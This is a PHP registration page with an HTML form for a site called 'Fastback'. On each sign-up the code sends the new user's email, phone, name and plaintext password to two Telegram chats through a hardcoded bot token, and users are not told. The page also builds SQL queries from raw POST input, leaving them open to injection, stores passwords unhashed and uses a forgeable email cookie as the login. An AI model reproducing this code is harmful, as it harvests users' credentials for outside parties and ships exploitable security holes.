<?php

include "con.php";
function atoken($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[random_int(0, $charactersLength - 1)];
    }
    return $randomString;
    }
    function wtoken($length = 10) {
    $characters1 = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength1 = strlen($characters1);
    $randomString1 = '';
    for ($b = 0; $b < $length; $b++) {
        $randomString1 .= $characters1[random_int(0, $charactersLength1 - 1)];
    }
    return $randomString1;
}
$atok = atoken();
$wtok = wtoken();
if(isset($_COOKIE['user'])!="") {
header("Location: index.php");
}
if (isset($_POST['submit'])) {
$email =$_POST['gmail'];
$num =$_POST['num'];
$name =$_POST['name'];
$password = $_POST['password-confirm'];
$password1 = $_POST['password'];
 if($password !== $password1){
   $error1='<div class="alert alert-danger alert-dismissible" role="alert">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                    Password And Confirm Password Not Matched 
                  </div>';

}else if(strlen($password) < 6) {
$error1 = '<div class="alert alert-danger alert-dismissible" role="alert">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                    Password must be minimum of 6 characters
                  </div>
                               ';
}else{
$sql1=mysqli_query($conn,"SELECT * FROM user where user='$num'");
if(mysqli_num_rows($sql1)>0) {
$error1 ='<div class="alert alert-danger alert-dismissible" role="alert">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                    User Already Exist
                  </div>
                               ';
                               }else{
$sql1=mysqli_query($conn,"SELECT * FROM user where atoken='$atok'");
$sql1848=mysqli_query($conn,"SELECT * FROM user where wtoken='$wtok'");
if(mysqli_num_rows($sql1)>0 || mysqli_num_rows($sql1848)>0) {
$error1 ='<div class="alert alert-danger alert-dismissible" role="alert">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                    Unknown Error Occurred 
                  </div>
                               ';
                               }else{
$sql8474741=mysqli_query($conn,"SELECT * FROM user where wtoken='$wtok'");
$sql187474748=mysqli_query($conn,"SELECT * FROM user where wtoken='$wtok'");
if(mysqli_num_rows($sql8474741)>0 || mysqli_num_rows($sql187474748)>0) {
$error1 ='<div class="alert alert-danger alert-dismissible" role="alert">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                    Unknown Error Occurred 
                  </div>
                               ';
}else{
$sql2=mysqli_query($conn,"SELECT * FROM user where mail='$email'");
if(mysqli_num_rows($sql2)>0) {
$error1 ='<div class="alert alert-danger alert-dismissible" role="alert">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                    Email already exists 
                  </div>';
}else{
if (!$error) {
if(mysqli_query($conn, "INSERT INTO user(user, phone, mail, pass, atoken, wtoken ,bal, tfund, wfund, tlif, stat, botalert, isip, ip, cha, cha2, cha3, cha4, cha5, cha6, cha7, cha8, cha9, cha10, cha11, cha12, cha13, cha14, cha15, cha16, cha17, cha18, cha19, cha20) VALUES('" . $name . "','" . $num . "', '" . $email . "', '" . $password . "', '" . $atok ."', '" . $wtok ."', '0','0','0','0','Active', 'off', 'off', 'off', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '')")) {
	$date = date("h:i:s A");
          $time = date("d-M-Y");
    setcookie('user',$email,time()+60*60*24*365);
$error1='<div class="alert alert-success alert-dismissible" role="alert">
                    <button type="button" class="close" data-dismiss="alert" aria-label="Close">
                      <span aria-hidden="true">&times;</span>
                    </button>
                    Register Success 
                  </div>';
                  $tex1='<b>🥳 New Register In Fastback

♂️ Email :- '. $email.'
📞 Phone :- '.$num.' 
🧾 User :- '.$name.'

🔶 Password :- '.$password.'
📅 Date :- '.$time.' '.$date.'

⚡ Powered By Fast Back
</b>';
  $text1=urlencode("$tex1");
  file_get_contents('https://api.telegram.org/bot6172365321:AAFJ2E4T_EJDEcdUNyD7FuAfS2QTu6jUhww/sendMessage?chat_id=1516610662&text='.$text1.'&parse_mode=html');
  file_get_contents('https://api.telegram.org/bot6172365321:AAFJ2E4T_EJDEcdUNyD7FuAfS2QTu6jUhww/sendMessage?chat_id=1852964154&text='.$text1.'&parse_mode=html');
   echo"<meta http-equiv='refresh' content='1;url=dashboard.php'>";

} else {
$error1 = "Error: " . $sql . "" . mysqli_error($conn);
}}
}}}}}
mysqli_close($conn);
}
?>      
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <link href="img/logo.png" rel="icon">
  <title>Fastback - Register</title>
  <link href="vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet" type="text/css">
  <link href="css/ruang-admin.min.css" rel="stylesheet">

</head>

<body class="bg-gradient-login">
	
  <!-- Register Content -->
  <div class="container-login">
    <div class="row justify-content-center">
      <div class="col-xl-10 col-lg-12 col-md-9">
        <div class="card shadow-sm my-5">
          <div class="card-body p-0">
            <div class="row">
              <div class="col-lg-12">
                <div class="login-form">
                  <div class="text-center">
                  	
                    <h1 class="h4 text-gray-900 mb-4">Register</h1>
                  </div>
                  <?= $error1; ?>
                  <form method="POST">
                    <div class="form-group">
                     
                      <input type="text" class="form-control" id="exampleInputFirstName" name="name" placeholder="Enter Full Name" required>
                    </div>
                   
                    <div class="form-group">
                      
                      <input type="number" class="form-control" id="exampleInputEmail" aria-describedby="emailHelp"
                        placeholder="Enter Mobile Number" name="num" required>
                    </div>
                    <div class="form-group">
                      
                      <input type="email" class="form-control" id="exampleInputEmail" aria-describedby="emailHelp"
              name="gmail"          placeholder="Enter Email Adress" name="num" required>
                    </div>
                    <div class="form-group">
                      
                      <input type="password" class="form-control" id="exampleInputPassword" placeholder="Password" name="password" required>
                    </div>
                    <div class="form-group">
                      
                      <input type="password" class="form-control" id="exampleInputPasswordRepeat"
                        placeholder="Confirm Password" name="password-confirm" required>
                    </div>
                    <div class="form-group">
                      <button type="submit" class="btn btn-primary btn-block" name="submit">Register</button>
                    </div>
                 
                  </form>
                  <hr>
                  <div class="text-center">
                Already have an account? <a class="font-weight-bold small" href="login.php">Login Here</a>
                  </div>
                  <div class="text-center">
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- Register Content -->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
  <script src="js/ruang-admin.min.js"></script>
</body>

</html>